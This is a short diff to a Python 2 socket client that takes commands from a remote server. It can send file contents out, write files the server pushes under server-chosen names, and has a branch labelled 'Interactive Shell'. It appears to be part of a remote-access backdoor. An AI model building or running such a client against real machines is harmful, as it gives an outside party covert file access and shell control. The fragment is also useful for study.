@@ -35,9 +35,13 @@ def main():
             s.send(read)
         # Recover File
         elif srv_cmd == "rcv_file":
-            rcv_f = open("newserverfile.txt", "wb+")
+            namef = s.recv(1024)
+            word_l = namef.split("/")
+            filename = word_l[-1]
+            print "[+] Filename: ", filename
             data_f = s.recv(4096)
-            rcv_f.write(data_f)
+            rcv_f = open(filename, "wb+")
+            rcv_f.write(data_f) 
             rcv_f.close()
             print "[+] Retrieved File: ", data_f
         # Interactive Shell
